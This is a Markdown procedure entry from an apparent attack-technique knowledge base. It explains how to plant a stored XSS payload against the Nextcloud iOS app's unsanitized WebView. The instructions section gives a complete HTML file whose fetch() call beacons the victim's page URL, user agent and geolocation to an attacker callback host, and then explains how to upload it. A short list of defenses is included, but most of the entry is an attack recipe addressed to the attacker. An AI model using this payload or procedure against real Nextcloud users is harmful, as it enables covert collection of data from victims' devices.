---
id: proc-uuid-1
tags:
  - xss
  - stored-xss
  - upload
  - nextcloud
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - iOS
  - Mobile App
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:42.909Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Upload-Malicious-HTML-XSS-Payload-to-Nextcloud

## Summary

This procedure involves creating and uploading an HTML file embedded with a blind XSS payload to a Nextcloud instance, setting the stage for stored XSS execution when viewed in the vulnerable iOS app.

## Description

The Nextcloud iOS App renders uploaded HTML files in an unsanitized WKWebView, allowing JavaScript execution. The attacker crafts an HTML file with JavaScript that sends victim details (IP, location, OS) to a controlled server upon loading. This payload, inspired by omespino's blind XSS writeup, is uploaded via the Nextcloud web interface. Prerequisites include attacker access to a Nextcloud account and a callback server (e.g., using ngrok or a VPS) to receive exfiltrated data.

## Requirements

1. Valid Nextcloud user account with upload permissions
2. Attacker-controlled server endpoint for data reception (e.g., HTTP listener)
3. Basic HTML/JavaScript knowledge to craft the payload

## Defense

Defensive measures and detection strategies:

- Enable content sanitization in Nextcloud apps for HTML files
- Disable JavaScript in WebView for non-interactive file previews
- Monitor uploads for suspicious HTML content with patterns like <script> tags

## Objectives

1. Store malicious payload on Nextcloud server
2. Ensure payload is shareable without triggering server-side sanitization
3. Prepare for blind execution without immediate feedback

## Instructions

### Step 1: Craft the Malicious HTML Payload

**Context**: Create an HTML file with embedded JavaScript that executes on load and beacons data to your server.

Use a text editor to create `malicious.html` with content like:

```html
<!DOCTYPE html>
<html>
<body>
<script>
// Blind XSS payload to exfiltrate data
fetch('https://your-callback-server.com/beacon?ip=' + encodeURIComponent(window.location.href) + '&ua=' + encodeURIComponent(navigator.userAgent) + '&geo=' + encodeURIComponent(JSON.stringify(navigator.geolocation)));
</script>
</body>
</html>
```

> This script sends the page URL, user agent (revealing OS like iOS), and geolocation on load. Customize the callback URL to your server.

### Step 2: Upload the File to Nextcloud

**Context**: Log in to Nextcloud web interface and upload the file to a accessible directory.

Navigate to your Nextcloud files section and use the upload button to select `malicious.html`.

> Expected output: File appears in the file list with upload success message. Verify by previewing in web (should not execute XSS in browser due to sanitization).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[nextcloud]]
